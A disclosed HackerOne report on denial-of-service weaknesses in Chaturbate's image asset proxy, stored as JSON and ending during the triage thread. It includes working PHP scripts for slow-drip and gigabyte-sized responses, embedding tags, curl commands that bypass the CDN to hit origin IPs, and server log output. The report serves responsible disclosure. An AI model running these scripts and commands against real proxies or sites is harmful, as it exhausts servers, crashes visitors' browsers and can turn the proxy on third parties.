{"id":507525,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDc1MjU=","url":"https://hackerone.com/reports/507525","title":"DoS attacks utilizing camo.stream.highwebmedia.com","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-03-10T20:15:44.641Z","submitted_at":"2019-03-10T20:15:44.641Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"teuvokas","url":"/teuvokas","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":30475,"url":"https://hackerone.com/chaturbate","handle":"chaturbate","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/030/475/178c32f60a890eb06ce5d698d44b3eafa35ccf8c_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Chaturbate","twitter_handle":"chaturbate","website":"https://chaturbate.com","about":"The largest online adult cam site"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-05-01T14:00:11.297Z","bug_reporter_agreed_on_going_public_at":"2019-05-01T14:00:11.211Z","team_member_agreed_on_going_public_at":"2019-04-30T21:30:49.168Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"# DoS attacks utilizing camo.stream.highwebmedia.com\n\n## Summary\n\nThe asset proxy at `camo.stream.highwebmedia.com` used to embed external images linked by users fails to enforce\n  1. a timeout on slow responses if a little data is sent every 10 seconds (a kind of \"reverse-slowloris\" attack)\n  1. a size limit on responses with `Transfer-Encoding: chunked` (i.e. no `Content-Length` header)\n\nDifferent types of Denial of Service attacks could be launched by utilizing these weaknesses.\n \n### Related findings that may be useful in attacks\n  1. The caching of responses by the CDN can be disabled\n      1. by returning status code 500 for the asset response (instead of 200 OK)\n      2. OR by appending a random query string to the https://camo.stream.highwebmedia.com/ URLs\n         - this alone could turn the asset proxy to a DoS-proxy for attacking other sites\n  1. The CDN can be bypassed altogether by logging the origin IPs of the requests from the asset servers and pointing \n  `camo.stream.highwebmedia.com` requests directly to them  (e.g. `curl https://camo.stream.highwebmedia.com/2ae5... --resolve camo.stream.highwebmedia.com:443:██████████43`)\n  1. The asset proxy will follow http redirects to other images \n  1. The asset proxy status page is publicly accessible (https://camo.stream.highwebmedia.com/status)\n\n## Steps to reproduce\n\n### Preparations\n\n* Configure a publicly accessible web server with PHP support and high timeout values. \n* Create `slow.php` that outputs a few kB of data every 9 seconds with `Transfer-Encoding: chunked` and status code 500\n\n```\n\u003c?php\n\nob_end_flush();\nheader(\"HTTP/1.1 500 Internal Server Error\");\nheader(\"Content-Type: image/png\");\nheader(\"Content-Length: \". 1024 * 1024 * 2);\n\nfor($i=0; $i\u003c200; $i++) {\n  echo str_pad('hi', 4096, \"hiho\");\n  flush();\n  sleep(9);\n}\n```\n\n* Create `big.php` that outputs lots of data with `Transfer-Encoding: chunked` and status code 500:\n\n```\n\u003c?php\n\nob_end_flush();\nheader(\"HTTP/1.1 500 Internal Server Error\");\nheader(\"Content-Type: image/png\");\n\n$total    = 1024**3; // 1G\n$buffSize = 1024**2; // 1M\n$buff     = str_pad('hi', $buffSize, \"hiho\");\n\nwhile($total \u003e 0) {\n echo $buff;\n $total -= $buffSize;\n}\n```\n\n* Create `big_valid.php` that outputs an extra large valid PNG image (e.g. 457 MB file from https://visibleearth.nasa.gov/view.php?id=73751) with `Transfer-Encoding: chunked`:\n\n```\n\u003c?php\n\nob_end_flush();\nheader(\"HTTP/1.1 200 OK\");\nheader(\"Content-Type: image/png\");\nreadfile(\"really_big.png\");\n```  \n\n* Create a White Label and add images to the Homepage intro (or a verified profile html):\n\n```\n\u003cimg src=\"http://███████/slow.php\"\u003e\n\u003cimg src=\"http://███/big.php\"\u003e\n\u003cimg src=\"http://█████/big_valid.php\"\u003e\n```\n\n* On the white label front page, the links will be rendered as follows:\n\n```\nslow.php:      https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/█████\nbig.php:       https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/█████████\nbig_valid.php: https://camo.stream.highwebmedia.com/0f82e8c654f4e58966f574d0f19ead4b71fe2d26/████████\n```\n\n### Attacks \n\n#### 1) Slow requests\n\n* Launch curl to fetch `slow.php` multiple times as background process (here targeting a specific proxy ip, but works OK thru the CDN too)\n  \n```\n$ time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:██████32 \u003e /dev/null \u0026\n```\n\n* Verify that the requests are still in pending after a while\n\n```\n$ jobs\n[1]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:██████32 \u003e /dev/null \u0026\n[2]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/██████ --resolve camo.stream.highwebmedia.com:443:██████32 \u003e /dev/null \u0026\n[3]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:████32 \u003e /dev/null \u0026\n...\n```\n\n* Confirm pending requests from the asset server\n\n```\n$ netstat -nt | grep ESTABLISHED | grep -c ████32\n20\n```\n\n* The requests typically stayed pending close to the 30 min timeout of the asset server, as seen from the nginx access.log (the 1500+ sec is the response time):\n\n```\n...\n██████████32 - - [10/Mar/2019:19:37:36 +0100] \"GET /slow.php HTTP/1.1\" 500 301 707302 707136 1549.636 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n██████████32 - - [10/Mar/2019:19:38:22 +0100] \"GET /slow.php HTTP/1.1\" 500 301 727742 727576 1594.828 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n████32 - - [10/Mar/2019:19:38:22 +0100] \"GET /slow.php HTTP/1.1\" 500 301 727742 727576 1594.405 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n█████████32 - - [10/Mar/2019:19:41:48 +0100] \"GET /slow.php HTTP/1.1\" 500 301 819366 819200 1800.059 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\n```\n\n#### 2) Excessive network traffic\n\n* Launch curl to fetch `big.php` a few times as background process \n\n```\n$ time curl -s https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/██████████ \u003e /dev/null \u0026 \n```\n\n* With just 3 concurrent curl instances, I was able to reach an outgoing transfer rate of over 600 Mbps from the asset server. Nginx access.log showed the following:\n\n```\n████34 - - [10/Mar/2019:19:38:15 +0100] \"GET /big.php HTTP/1.1\" 500 300 1073742118 1073741949 49.271 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n█████40 - - [10/Mar/2019:19:38:23 +0100] \"GET /big.php HTTP/1.1\" 500 300 1073742145 1073741976 55.455 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n█████34 - - [10/Mar/2019:19:38:36 +0100] \"GET /big.php HTTP/1.1\" 500 300 1073742126 1073741957 68.682 \"-\" \"Camo Asset Proxy 2.5.0\" \"-\"\n```\n\n#### 3) Crashing the end-user's browser\n\n* When using a normal browser to go to the white label front page that has the `big_valid.php` PNG embedded (e.g. https://latesty.chaturbate.com), the browser is likely to become unstable or crash. Especially Chrome seems to crash easily with huge PNGs embedded into a web page.\n* The CDN will cache the large image file saving bandwidth from the attacker\n\n## Impact\n\n* The slow responses could probably be used exhaust the asset proxy server concurrency limits or available sockets.\n* The large downloads could be used to exhaust network capacity or available memory/disk space on the proxy server.\n* Embedding large but valid images to user profiles can be used to make the end-user's browsers unstable\n* The asset proxy servers could also be used to launch proxied DoS attacks against external web servers, especially those that host large images but do not supply a Content-Length header","vulnerability_information_html":"\u003ch1 id=\"dos-attacks-utilizing-camo-stream-highwebmedia-com\"\u003eDoS attacks utilizing camo.stream.highwebmedia.com\u003c/h1\u003e\n\n\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\n\u003cp\u003eThe asset proxy at \u003ccode\u003ecamo.stream.highwebmedia.com\u003c/code\u003e used to embed external images linked by users fails to enforce\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003ea timeout on slow responses if a little data is sent every 10 seconds (a kind of \u0026quot;reverse-slowloris\u0026quot; attack)\u003c/li\u003e\n\u003cli\u003ea size limit on responses with \u003ccode\u003eTransfer-Encoding: chunked\u003c/code\u003e (i.e. no \u003ccode\u003eContent-Length\u003c/code\u003e header)\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eDifferent types of Denial of Service attacks could be launched by utilizing these weaknesses.\u003c/p\u003e\n\n\u003ch3 id=\"related-findings-that-may-be-useful-in-attacks\"\u003eRelated findings that may be useful in attacks\u003c/h3\u003e\n\n\u003col\u003e\n\u003cli\u003eThe caching of responses by the CDN can be disabled\n\n\u003col\u003e\n\u003cli\u003eby returning status code 500 for the asset response (instead of 200 OK)\u003c/li\u003e\n\u003cli\u003eOR by appending a random query string to the \u003ca title=\"https://camo.stream.highwebmedia.com/\" href=\"/redirect?url=https%3A%2F%2Fcamo.stream.highwebmedia.com%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://camo.stream.highwebmedia.com/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e URLs\n\n\u003cul\u003e\n\u003cli\u003ethis alone could turn the asset proxy to a DoS-proxy for attacking other sites\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003cli\u003eThe CDN can be bypassed altogether by logging the origin IPs of the requests from the asset servers and pointing \n\u003ccode\u003ecamo.stream.highwebmedia.com\u003c/code\u003e requests directly to them  (e.g. \u003ccode\u003ecurl https://camo.stream.highwebmedia.com/2ae5... --resolve camo.stream.highwebmedia.com:443:██████████43\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003eThe asset proxy will follow http redirects to other images \u003c/li\u003e\n\u003cli\u003eThe asset proxy status page is publicly accessible (\u003ca title=\"https://camo.stream.highwebmedia.com/status\" href=\"/redirect?url=https%3A%2F%2Fcamo.stream.highwebmedia.com%2Fstatus\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://camo.stream.highwebmedia.com/status\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h2\u003e\n\n\u003ch3 id=\"preparations\"\u003ePreparations\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eConfigure a publicly accessible web server with PHP support and high timeout values. \u003c/li\u003e\n\u003cli\u003eCreate \u003ccode\u003eslow.php\u003c/code\u003e that outputs a few kB of data every 9 seconds with \u003ccode\u003eTransfer-Encoding: chunked\u003c/code\u003e and status code 500\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eob_end_flush\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;HTTP/1.1 500 Internal Server Error\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Content-Type: image/png\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Content-Length: \u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e \u003cspan class=\"mi\"\u003e1024\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e1024\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e \u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003efor\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"mi\"\u003e200\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"nv\"\u003e$i\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_pad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hi\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e4096\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;hiho\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nb\"\u003eflush\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"nb\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eCreate \u003ccode\u003ebig.php\u003c/code\u003e that outputs lots of data with \u003ccode\u003eTransfer-Encoding: chunked\u003c/code\u003e and status code 500:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eob_end_flush\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;HTTP/1.1 500 Internal Server Error\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Content-Type: image/png\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"nv\"\u003e$total\u003c/span\u003e    \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1024\u003c/span\u003e\u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// 1G\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$buffSize\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1024\u003c/span\u003e\u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e// 1M\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$buff\u003c/span\u003e     \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003estr_pad\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;hi\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$buffSize\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;hiho\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$total\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n \u003cspan class=\"k\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$buff\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n \u003cspan class=\"nv\"\u003e$total\u003c/span\u003e \u003cspan class=\"o\"\u003e-=\u003c/span\u003e \u003cspan class=\"nv\"\u003e$buffSize\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eCreate \u003ccode\u003ebig_valid.php\u003c/code\u003e that outputs an extra large valid PNG image (e.g. 457 MB file from \u003ca title=\"https://visibleearth.nasa.gov/view.php?id=73751\" href=\"/redirect?url=https%3A%2F%2Fvisibleearth.nasa.gov%2Fview.php%3Fid%3D73751\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://visibleearth.nasa.gov/view.php?id=73751\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) with \u003ccode\u003eTransfer-Encoding: chunked\u003c/code\u003e:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"nb\"\u003eob_end_flush\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;HTTP/1.1 200 OK\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;Content-Type: image/png\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003ereadfile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;really_big.png\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eCreate a White Label and add images to the Homepage intro (or a verified profile html):\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;img src=\u0026quot;http://███████/slow.php\u0026quot;\u0026gt;\n\u0026lt;img src=\u0026quot;http://███/big.php\u0026quot;\u0026gt;\n\u0026lt;img src=\u0026quot;http://█████/big_valid.php\u0026quot;\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eOn the white label front page, the links will be rendered as follows:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eslow.php:      https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/█████\nbig.php:       https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/█████████\nbig_valid.php: https://camo.stream.highwebmedia.com/0f82e8c654f4e58966f574d0f19ead4b71fe2d26/████████\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"attacks\"\u003eAttacks\u003c/h3\u003e\n\n\u003ch4 id=\"1-slow-requests\"\u003e1) Slow requests\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003eLaunch curl to fetch \u003ccode\u003eslow.php\u003c/code\u003e multiple times as background process (here targeting a specific proxy ip, but works OK thru the CDN too)\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:██████32 \u0026gt; /dev/null \u0026amp;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eVerify that the requests are still in pending after a while\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ jobs\n[1]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:██████32 \u0026gt; /dev/null \u0026amp;\n[2]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/██████ --resolve camo.stream.highwebmedia.com:443:██████32 \u0026gt; /dev/null \u0026amp;\n[3]   Running                 time curl -s https://camo.stream.highwebmedia.com/4854b41b7c19a74ff2007dced08a28a6b67459a8/████ --resolve camo.stream.highwebmedia.com:443:████32 \u0026gt; /dev/null \u0026amp;\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eConfirm pending requests from the asset server\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ netstat -nt | grep ESTABLISHED | grep -c ████32\n20\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eThe requests typically stayed pending close to the 30 min timeout of the asset server, as seen from the nginx access.log (the 1500+ sec is the response time):\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e...\n██████████32 - - [10/Mar/2019:19:37:36 +0100] \u0026quot;GET /slow.php HTTP/1.1\u0026quot; 500 301 707302 707136 1549.636 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n██████████32 - - [10/Mar/2019:19:38:22 +0100] \u0026quot;GET /slow.php HTTP/1.1\u0026quot; 500 301 727742 727576 1594.828 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n████32 - - [10/Mar/2019:19:38:22 +0100] \u0026quot;GET /slow.php HTTP/1.1\u0026quot; 500 301 727742 727576 1594.405 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n█████████32 - - [10/Mar/2019:19:41:48 +0100] \u0026quot;GET /slow.php HTTP/1.1\u0026quot; 500 301 819366 819200 1800.059 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"2-excessive-network-traffic\"\u003e2) Excessive network traffic\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003eLaunch curl to fetch \u003ccode\u003ebig.php\u003c/code\u003e a few times as background process \u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ time curl -s https://camo.stream.highwebmedia.com/a7a0e0c605129fb8640a463bcc71a78b909f41f3/██████████ \u0026gt; /dev/null \u0026amp; \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cul\u003e\n\u003cli\u003eWith just 3 concurrent curl instances, I was able to reach an outgoing transfer rate of over 600 Mbps from the asset server. Nginx access.log showed the following:\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e████34 - - [10/Mar/2019:19:38:15 +0100] \u0026quot;GET /big.php HTTP/1.1\u0026quot; 500 300 1073742118 1073741949 49.271 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n█████40 - - [10/Mar/2019:19:38:23 +0100] \u0026quot;GET /big.php HTTP/1.1\u0026quot; 500 300 1073742145 1073741976 55.455 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n█████34 - - [10/Mar/2019:19:38:36 +0100] \u0026quot;GET /big.php HTTP/1.1\u0026quot; 500 300 1073742126 1073741957 68.682 \u0026quot;-\u0026quot; \u0026quot;Camo Asset Proxy 2.5.0\u0026quot; \u0026quot;-\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch4 id=\"3-crashing-the-end-user-s-browser\"\u003e3) Crashing the end-user\u0026#39;s browser\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003eWhen using a normal browser to go to the white label front page that has the \u003ccode\u003ebig_valid.php\u003c/code\u003e PNG embedded (e.g. \u003ca title=\"https://latesty.chaturbate.com\" href=\"/redirect?url=https%3A%2F%2Flatesty.chaturbate.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://latesty.chaturbate.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), the browser is likely to become unstable or crash. Especially Chrome seems to crash easily with huge PNGs embedded into a web page.\u003c/li\u003e\n\u003cli\u003eThe CDN will cache the large image file saving bandwidth from the attacker\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eThe slow responses could probably be used exhaust the asset proxy server concurrency limits or available sockets.\u003c/li\u003e\n\u003cli\u003eThe large downloads could be used to exhaust network capacity or available memory/disk space on the proxy server.\u003c/li\u003e\n\u003cli\u003eEmbedding large but valid images to user profiles can be used to make the end-user\u0026#39;s browsers unstable\u003c/li\u003e\n\u003cli\u003eThe asset proxy servers could also be used to launch proxied DoS attacks against external web servers, especially those that host large images but do not supply a Content-Length header\u003c/li\u003e\n\u003c/ul\u003e\n","bounty_amount":"400.0","formatted_bounty":"$400","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-05-30T21:30:49.258Z","allow_singular_disclosure_after":-49970461.40521084,"singular_disclosure_allowed":true,"vote_count":39,"voters":["yxw21","mik317","mygf","eveeez","m7mdharoun","k_outis","chilliesssssss7","cryptographer","realjesebel","0619","and 29 more..."],"severity":{"rating":"medium","score":5.3,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":11723,"asset_type":"URL","asset_identifier":"*.highwebmedia.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4305755,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @teuvokas,\n\nThanks for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@beagle ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/teuvokas\"\u003e@teuvokas\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks for your submission. Your report is currently being 